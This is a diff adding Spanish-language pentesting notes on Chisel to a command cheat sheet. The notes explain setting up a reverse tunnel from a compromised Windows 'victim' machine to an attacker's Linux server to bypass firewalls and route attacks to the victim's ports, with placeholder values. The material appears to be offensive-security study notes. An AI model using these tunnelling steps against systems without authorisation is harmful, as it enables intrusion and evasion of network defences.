@@ -50,4 +50,59 @@ Para cambiar el nombre de archivo2.txt por archivo3.txt, se puede usar el comand
 
     REN archivo2.txt archivo3.txt 
     
+    
+# Crear un tunel con Chisel entre Linux y Windows:
+
+##¿Qué es Chisel?
+
+``Chisel es un túnel TCP/UDP rápido, transportado a través des servicio HTTP y protegido a través de SSH``. Esta escrito en Go  y utiliza el
+protocolo de ``cliente`` a ``servidor``.  Chisel es principalmente útil para pasar a través de firewalls, aunque también se puede usar para 
+proporcionar un punto final seguro en su red.
+
+## Redireccionar puertos con Chisel a nuestra localhost:
+
+Una vez hemos ganado acceso o tenemos la posibilidad de subir archivos y ejecutar comandos en el dispoditivo víctima, podemos crear un tunel
+con ``chisel``. Mediante esta herramienta podremos establecer una conexión de ``cliente`` a ``servidor`` y conectar dos puertos entre si.
+Básicamente conectamos un puerto de la máquina víctima con uno de nuestro equipo, de tal forma, que podemos ejecutar cualquier herramienta en 
+local utilizando ese puerto, y automaticamente se redireccionara el ataque a la maquina victima.
+
+### Establecer conexión por parte del Servidor (Linux):
+
+En primer lugar, debemos de estabecer ``Chisel`` en modo ``Servidor`` en nuestro sistema Linux, para ello debemos de asegurarnos que la versión de
+Chisel instalada es la adecuada para nuestra distribución. Para establecer nuestro sistema como servidor simplemente ejecutamos el siguiente comando
+especificando el puerto que por el que vamos a establecer la conexión. Es importante que este puerto no se encutre en us.
+
+    chisel serve --reverse --port [Puerto Local Conexión] 
+    
+    ./chisel serve --reverse -p [Puerto Local Conexión] 
+
+``Ejemplo``
+
+    chisel serve --reverse -p 8081
+
+Aquí podemos ver como en el ejemplo hemos establecido un servicio de servidor con Chisel por el puerto 8081, este puerto es el que posteriormente
+tendremos que especificar en el servicio por parte del Cliente para realizar la conexión.
+    
+
+### Establecer conexión por parte del Cliente (Windows):
+
+Para establecer Chisel en un sistema Windows como ``Cliente``, nos descargamos la versión especifica para Windows (debemos de comprobar 
+si el sistema es de 32 o 64 bits) y ejecutamos el siguiente comando. En el debemos especificar el puerto por el que vamos a comunicarnos 
+con nuestro servicio ``Servidor`` y los puestos que vamos a comunicar entre si:
+
+
+    .\chisel.exe client [Ip Local]:[Puerto de Conexión] R:[Puerto Víctima]:127.0.0.1:[Puerto Local]
+    
+``[Ip Local]``: Es la Ip de nuestro sistema Servidor. O en caso de estar conectados por VPN su Ip pública.  
+    
+``[Puerto de Conexión]``: Es el puerto establecido en la conexión con el Servidor. Debe ser el mismo puerto que especificado en el sistema Linux.  
+    
+``[Puerto Víctima]`` y ``[Puerto Local]``: El puerto Víctima pasará a ser el puerto local de nuestro local host 127.0.0.1.
+    
+    
+
+    
+
+
+    
 
